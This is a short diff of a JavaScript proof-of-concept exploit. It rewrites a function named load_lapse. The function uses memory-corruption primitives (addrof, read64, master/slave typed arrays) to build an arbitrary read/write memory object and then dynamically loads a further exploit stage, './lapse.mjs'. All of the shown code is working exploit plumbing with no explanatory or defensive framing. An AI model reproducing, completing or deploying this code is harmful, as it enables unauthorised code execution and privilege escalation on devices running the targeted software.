@@ -395,35 +395,8 @@ function poc() {
     m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
     m[7] = 1;
 
- async function load_lapse() {
-   
-    let { Memory } = await import('./module/mem.mjs');
-    let { Int    } = await import('./module/int64.mjs');
 
-   
-    let obj   = { addr: null, 0: 0 };
-    let obj_p = addrof(obj);              // Int
-    let bt    = read64(obj_p.add(8));     // Int-like { low, hi }
-    
-  
-    obj_p  = new Int(obj_p.low, obj_p.hi);
-    let obj_bt = new Int(bt.low, bt.hi);
-
-    let memory = new Memory(
-      expl_master,    // Uint32Array
-      expl_slave,     // DataView
-      obj,            // scratch object
-      obj_p.add(0x10),
-      obj_bt
-    );
-
-    let lapse = await import('./lapse.mjs');
-    if (typeof lapse.setup === 'function') {
-      lapse.setup(memory);
-    }
-}
-
-/*async function load_lapse(){
+async function load_lapse(){
 	   
         let mod = await import('./module/mem.mjs');
         let imod = await import('./module/int64.mjs');
@@ -435,7 +408,7 @@ function poc() {
         obj_bt = new imod.Int(obj_bt.low, obj_bt.hi);
         new Memory(expl_master, expl_slave, obj, obj_p.add(0x10), obj_bt);
         import('./lapse.mjs');
-    }*/
+    }
     load_lapse();
 	return;
 
